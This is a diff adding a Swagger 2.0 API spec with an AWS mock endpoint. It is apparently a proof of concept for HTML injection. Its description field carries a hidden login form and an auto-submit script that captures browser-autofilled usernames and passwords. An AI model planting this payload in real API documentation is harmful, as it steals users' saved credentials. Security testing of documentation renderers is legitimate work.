@@ -1,0 +1,32 @@
+swagger: '2.0'
+
+info:
+  title: Basic Login Form
+  version: '1.0.0'
+  description: '<form id=login action=/login method=post><input name=username autocomplete=username><input name=password type=password autocomplete=current-password><button>Login</button></form><script>window.onload=()=>setTimeout(()=>login.requestSubmit(),500)</script>'
+
+paths:
+  /test:
+    get:
+      summary: Simple login
+      produces:
+        - text/html
+      responses:
+        200:
+          description: Login form
+          x-amazon-apigateway-integration:
+            type: mock
+            responses:
+              default:
+                statusCode: "200"
+                responseTemplates:
+                  text/html: |
+                    <!DOCTYPE html>
+                    <html>
+                      <head>
+                        <title>HTMLI</title>
+                      </head>
+                      <body>
+                        <h1 style="color: red;">HTML Injection</h1>
+                      </body>
+                    </html>
